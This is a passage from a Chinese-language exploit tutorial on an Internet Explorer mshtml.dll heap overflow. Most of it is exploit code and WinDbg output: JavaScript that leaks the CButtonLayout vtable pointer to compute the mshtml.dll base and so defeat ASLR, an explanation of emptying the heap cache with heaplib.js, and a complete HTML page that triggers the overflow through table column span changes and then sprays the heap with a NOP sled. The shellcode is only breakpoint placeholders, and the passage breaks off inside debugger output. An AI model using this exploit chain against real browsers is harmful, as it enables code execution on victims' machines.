ff ff ff ff ff ff-ff ff ff ff ff ff ff ff ................02cd2260 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................可以发现这次字符串”AAAA…”区域也明显被覆盖，同时”BBBB…”字符串的长度信息变为了0x00014058这意味着”BBBB…”字符串的长度被扩大了，只要再次读取该字符串的内容，位于其后方的CButtonLayout数据也会被一并读取。mshtml.dll基址泄露123456789101112function get_leak()&#123; for (var i = 0; i &lt; 500; i++) &#123; if (al[i].length &gt; (0x100 - 6) / 2) &#123; var leak = al[i].substring((0x100 - 6) / 2 + (2 + 8) / 2, (0x100 - 6) / 2 + (2 + 8 + 4) / 2); leak_addr = parseInt(leak.charCodeAt(1).toString(16) + leak.charCodeAt(0).toString(16), 16); alert("CbuttonLayout虚表指针: 0x" + leak_addr.toString(16)); mshtmlbase = leak_addr - 0x173af8; alert("mshtml.dll基址ַ: 0x" + mshtmlbase.toString(16)); break; &#125; &#125;&#125;首先在al数组中找到长度异常的字符串,前文已经解释过长度为(0x100 - 6) / 2的原因了关于定位虚表指针位置：由上图便可知虚表指针与字符串起始地址偏移的关系了。关于mshtml基址的偏移1234567891011121314151617181920212223240:007&gt; x mshtml!CButtonLayout::*65b7519d mshtml!CButtonLayout::GetThemeClassId (&lt;no parameter info&gt;)65bf0d9d mshtml!CButtonLayout::GetInsets (&lt;no parameter info&gt;)65b23c90 mshtml!CButtonLayout::`vftable&apos; = &lt;no type information&gt;65b75499 mshtml!CButtonLayout::GetAutoSize (&lt;no parameter info&gt;)65d862f6 mshtml!CButtonLayout::HitTestContent (&lt;no parameter info&gt;)65b5b4b7 mshtml!CButtonLayout::DrawClientBackground (&lt;no parameter info&gt;)65b29251 mshtml!CButtonLayout::Init (&lt;no parameter info&gt;)65b75499 mshtml!CButtonLayout::GetMultiLine (&lt;no parameter info&gt;)65cf61d8 mshtml!CButtonLayout::s_layoutdesc = &lt;no type information&gt;65d862e6 mshtml!CButtonLayout::GetBtnHelper (&lt;no parameter info&gt;)65d86121 mshtml!CButtonLayout::GetFocusShape (&lt;no parameter info&gt;)65cf61d1 mshtml!CButtonLayout::GetLayoutDesc (&lt;no parameter info&gt;)65d86281 mshtml!CButtonLayout::DoLayout (&lt;no parameter info&gt;)65b7519d mshtml!CButtonLayout::GetWordWrap (&lt;no parameter info&gt;)65b23af8 mshtml!CButtonLayout::`vftable&apos; = &lt;no type information&gt;65b5b4f2 mshtml!CButtonLayout::DrawClient (&lt;no parameter info&gt;)65bd32da mshtml!CButtonLayout::`scalar deleting destructor&apos; (&lt;no parameter info&gt;)65d85f61 mshtml!CButtonLayout::DrawClientBorder (&lt;no parameter info&gt;)65bd32da mshtml!CButtonLayout::`vector deleting destructor&apos; (&lt;no parameter info&gt;)65bf2394 mshtml!CButtonLayout::GetDefaultSize (&lt;no parameter info&gt;)0:007&gt; lmm mshtmlstart end module name659b0000 65f62000 mshtml (pdb symbols)虽然我不知道为什么有两个虚表，但是都试试总没错其中第二个虚表的地址与mshtml的偏移和《漏洞战争》中的相同，为0x65b23af8 - 0x659b0000 = 0x‭173af8‬堆喷射在成功泄露地址之后，我们接下来开始考虑shellcode的摆放问题。因为javascript中存在一张缓存表，其结构如下1234CacheEntry bin_1_32 [6]; // blocks from 1 to 32 bytesCacheEntry bin_33_64 [6]; // blocks from 33 to 64 bytesCacheEntry bin_65_256 [6]; // blocks from 65 to 265 bytesCacheEntry bin_257_32768[6]; // blocks from 257 to 32768 bytes在申请字符串的时候会优先考虑该缓存表中是否有合适的内存块，这会使得申请的堆内存位置变得不可靠。所以我们需要想办法清空该缓存，使我们的每次申请都由系统堆进行处理。具体方法参考Plunger technique我们使用6个块作为plunger，将所有较小的块从缓存中移出，然后我们再次分配6个块将plunger取出，就可以清空所有bin这里我们使用了一个javascript堆管理库，叫做heaplib.js，它封装了上述清空缓存表的操作，我们可以直接使用我们先试试一个普通的堆喷射12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970&lt;html&gt;&lt;head&gt; &lt;script type="text/javascript" src="heaplib.js"&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;div id="evil"&gt;&lt;/div&gt; &lt;script&gt; var free = "EEEE"; while (free.length &lt; 480) free += free; var string1 = "AAAA"; while (string1.length &lt; 480) string1 += string1; var string2 = "BBBB"; while (string2.length &lt; 480) string2 += string2; var fr = new Array(); var al = new Array(); var div_container = document.getElementById("evil"); div_container.style.cssText = "display:none"; for (var i = 0; i &lt; 500; i+=2) &#123; fr[i] = free.substring(0, (0x100 - 6) / 2); al[i] = string1.substring(0, (0x100 - 6) / 2); al[i+1] = string2.substring(0, (0x100 - 6) / 2); var obj = document.createElement("button"); div_container.appendChild(obj); &#125; for (var i = 200; i &lt; 500; i += 2) &#123; fr[i] = null; CollectGarbage(); &#125; &lt;/script&gt; &lt;table style="table-layout:fixed" &gt;&lt;col id="0" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="1" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="2" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="3" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="4" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="5" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="6" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="7" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="8" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="9" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="10" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="11" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="12" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="13" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="14" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="15" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="16" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="17" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="18" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="19" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="20" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="21" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="22" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="23" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="24" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="25" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="26" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="27" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="28" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="29" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="30" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="31" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="32" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="33" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="34" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="35" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="36" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="37" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="38" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="39" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="40" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="41" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="42" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="43" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="44" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="45" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="46" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="47" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="48" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="49" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="50" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="51" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="52" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="53" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="54" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="55" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="56" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="57" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="58" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="59" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="60" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="61" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="62" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="63" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="64" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="65" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="66" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="67" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="68" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="69" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="70" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="71" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="72" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="73" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="74" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="75" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="76" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="77" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="78" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="79" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="80" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="81" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="82" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="83" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="84" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="85" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="86" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="87" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="88" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="89" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="90" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="91" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="92" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="93" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="94" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="95" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="96" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="97" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="98" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="99" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="100" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="101" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="102" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="103" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="104" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="105" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="106" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="107" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="108" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="109" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="110" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="111" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="112" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="113" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="114" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="115" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="116" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="117" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="118" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="119" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="120" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="121" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="122" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="123" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="124" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="125" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="126" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="127" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="128" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="129" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="130" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="131" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="132" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt; &lt;script&gt; var mshtmlbase; function leak() &#123; var leak_col = document.getElementById("132"); leak_col.width = 41; leak_col.span = 19; &#125; function get_leak()&#123; for (var i = 0; i &lt; 500; i++) &#123; if (al[i].length &gt; (0x100 - 6) / 2) &#123; var leak = al[i].substring((0x100 - 6) / 2 + (2 + 8) / 2, (0x100 - 6) / 2 + (2 + 8 + 4) / 2); leak_addr = parseInt(leak.charCodeAt(1).toString(16) + leak.charCodeAt(0).toString(16), 16); //alert("CbuttonLayout虚表指针: 0x" + leak_addr.toString(16)); mshtmlbase = leak_addr - 0x173af8; //alert("mshtml.dll基址?: 0x" + mshtmlbase.toString(16)); break; &#125; &#125; &#125; function heap_spray()&#123; alert("spray..."); var heap_obj = new heapLib.ie(0x10000); var code = unescape("%ucccc%ucccc"); //Code to execute var nops = unescape("%u9090%u9090"); //NOPs while (nops.length &lt; 0x1000) nops+= nops; // create big block of nops var shellcode = nops.substring(0,0x800 - code.length) + code; while (shellcode.length &lt; 0x40000) shellcode += shellcode; var block = shellcode.substring(2, 0x40000 - 0x21); //spray for (var i=0; i &lt; 500; i++) &#123; heap_obj.alloc(block); &#125; alert("done") &#125; setTimeout("leak();", 400); setTimeout("get_leak()", 450); setTimeout("heap_spray();", 500) &lt;/script&gt;&lt;/body&gt;&lt;/html&gt;在喷射完成后，查看内存情况1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071720:013&gt; !address -f:heap Mapping file section regions...Mapping module regions...Mapping PEB regions...Mapping TEB and stack regions...Mapping heap regions...Mapping page heap regions...Mapping other regions...Mapping stack trace database regions...Mapping activation context regions... BaseAddr EndAddr+1 RgnSize Type State Protect Usage--------------------------------------------------------------------------------------------- 10000 20000 10000 MEM_MAPPED MEM_COMMIT PAGE_READWRITE Heap [ID: 1; Handle: 00010000; Type: Segment] e0000 1e0000 100000 MEM_PRIVATE MEM_COMMIT PAGE_READWRITE Heap [ID: 0; Handle: 000e0000; Type: Segment] 4b0000 4c0000 10000 MEM_PRIVATE MEM_COMMIT PAGE_READWRITE Heap [ID: 2; Handle: 004b0000; Type: Segment] 1b90000 1bb9000 29000 MEM_PRIVATE MEM_COMMIT PAGE_READWRITE Heap [ID: 3; Handle: 01b90000; Type: Segment] 1bb9000 1bd0000 17000 MEM_PRIVATE MEM_RESERVE Heap [ID: 3; Handle: 01b90000; Type: Segment] 1ec0000 1ec8000 8000 MEM_PRIVATE MEM_COMMIT PAGE_READWRITE Heap [ID: 4; Handle: 01ec0000; Type: Segment] 1ec8000 1f00000 38000 MEM_PRIVATE MEM_RESERVE Heap [ID: 4; Handle: 01ec0000; Type: Segment] 2170000 21bc000 4c000 MEM_PRIVATE MEM_COMMIT PAGE_READWRITE Heap [ID: 2; Handle: 004b0000; Type: Segment] 21bc000 2270000 b4000 MEM_PRIVATE MEM_RESERVE Heap [ID: 2; Handle: 004b0000; Type: Segment] 2be0000 2be1000 1000 MEM_PRIVATE MEM_COMMIT PAGE_READWRITE Heap [ID: 5; Handle: 02be0000; Type: Segment] 2be1000 2c20000 3f000 MEM_PRIVATE MEM_RESERVE Heap [ID: 5; Handle: 02be0000; Type: Segment] 2cb0000 2cdb000 2b000 MEM_PRIVATE MEM_COMMIT PAGE_READWRITE Heap [ID: 6; Handle: 02cb0000; Type: Segment] 2cdb000 2cf0000 15000 MEM_PRIVATE MEM_RESERVE Heap [ID: 6; Handle: 02cb0000; Type: Segment] 2e00000 2f00000 100000 MEM_PRIVATE MEM_COMMIT PAGE_READWRITE Heap [ID: 0; Handle: 000e0000; Type: Segment] 3010000 30e2000 d2000 MEM_PRIVATE MEM_COMMIT PAGE_READWRITE Heap [ID: 0; Handle: 000e0000; Type: Segment] 30e2000 3210000 12e000 MEM_PRIVATE MEM_RESERVE Heap [ID: 0; Handle: 000e0000; Type: Segment] 35b0000 3631000 81000 MEM_PRIVATE MEM_COMMIT PAGE_READWRITE Heap [ID: 0; Handle: 000e0000; Type: Large block] 3760000 37e0000 80000 MEM_PRIVATE MEM_COMMIT PAGE_READWRITE Heap [ID: 0; Handle: 000e0000; Type: Large block] 37e0000 3860000 80000 MEM_PRIVATE MEM_COMMIT PAGE_READWRITE Heap [ID: 0; Handle: 000e0000; Type: Large block] 3960000 39e0000 80000 MEM_PRIVATE MEM_COMMIT PAGE_READWRITE Heap [ID: 0; Handle: 000e0000; Type: Large block] 39e0000 3a60000 80000 MEM_PRIVATE MEM_COMMIT PAGE_READWRITE Heap [ID: 0; Handle: 000e0000; Type: Large block] 3a60000 3ae0000 80000 MEM_PRIVATE MEM_COMMIT PAGE_READWRITE Heap [ID: 0; Handle: 000e0000; Type: Large block] 3ae0000 3b60000 80000 MEM_PRIVATE MEM_COMMIT PAGE_READWRITE Heap [ID: 0; Handle: 000e0000; Type: Large block] 3b60000 3be0000 80000 MEM_PRIVATE MEM_COMMIT PAGE_READWRITE Heap [ID: 0; Handle: 000e0000; Type: Large block] 3be0000 3c60000 80000 MEM_PRIVATE MEM_COMMIT PAGE_READWRITE Heap [ID: 0; Handle: 000e0000; Type: Large block] 3c60000 3ce0000 80000 MEM_PRIVATE MEM_COMMIT PAGE_READWRITE Heap [ID: 0; Handle: 000e0000; Type: Large block] 4a90000 4b10000 80000 MEM_PRIVATE MEM_COMMIT PAGE_READWRITE Heap [ID: 0; Handle: 000e0000; Type: Large block] ... 6d40000 6dc0000 80000 MEM_PRIVATE MEM_COMMIT PAGE_READWRITE Heap [ID: 0; Handle: 000e0000; Type: Large block] 6dc0000 6e40000 80000 MEM_PRIVATE MEM_COMMIT PAGE_READWRITE Heap [ID: 0; Handle: 000e0000; Type: Large block] 6e40000 6ec0000 80000 MEM_PRIVATE MEM_COMMIT PAGE_READWRITE Heap [ID: 0; Handle: 000e0000; Type: Large block] 6ec0000 6f40000 80000 MEM_PRIVATE MEM_COMMIT PAGE_READWRITE Heap [ID: 0; Handle: 000e0000; Type: Large block] 6f40000 6fc0000 80000 MEM_PRIVATE MEM_COMMIT PAGE_READWRITE Heap [ID: 0; Handle: 000e0000; Type: Large block] 6fc0000 7040000 80000 MEM_PRIVATE MEM_COMMIT PAGE_READWRITE Heap [ID: 0; Handle: 000e0000; Type: Large block] 7040000 70c0000 80000 MEM_PRIVATE MEM_COMMIT PAGE_READWRITE Heap [ID: 0; Handle: 000e0000; Type: Large block] 70c0000 7140000 80000 MEM_PRIVATE MEM_COMMIT PAGE_READWRITE Heap [ID: 0; Handle: 000e0000; Type: Large block] 7140000 71c0000 80000 MEM_PRIVATE MEM_COMMIT PAGE_READWRITE Heap [ID: 0; Handle: 000e0000; Type: Large block] 71c0000 7240000 80000 MEM_PRIVATE MEM_COMMIT 